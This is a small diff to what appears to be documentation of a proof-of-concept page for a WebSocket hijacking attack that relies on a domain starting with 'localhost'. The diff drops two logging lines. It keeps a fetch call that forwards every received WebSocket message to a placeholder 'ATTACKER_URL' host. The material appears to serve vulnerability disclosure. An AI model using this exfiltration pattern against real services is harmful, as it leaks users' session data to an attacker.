@@ -145,8 +145,6 @@ The following page needs to be hosted on a domain starting with `localhost` and 
                 };
 
                 ws.onmessage = function incoming(data) {
-                    console.log(data);
-                    console.log(data.origin);
                     fetch("http://ATTACKER_URL/?quote=" + data.data)
                 };
             })();
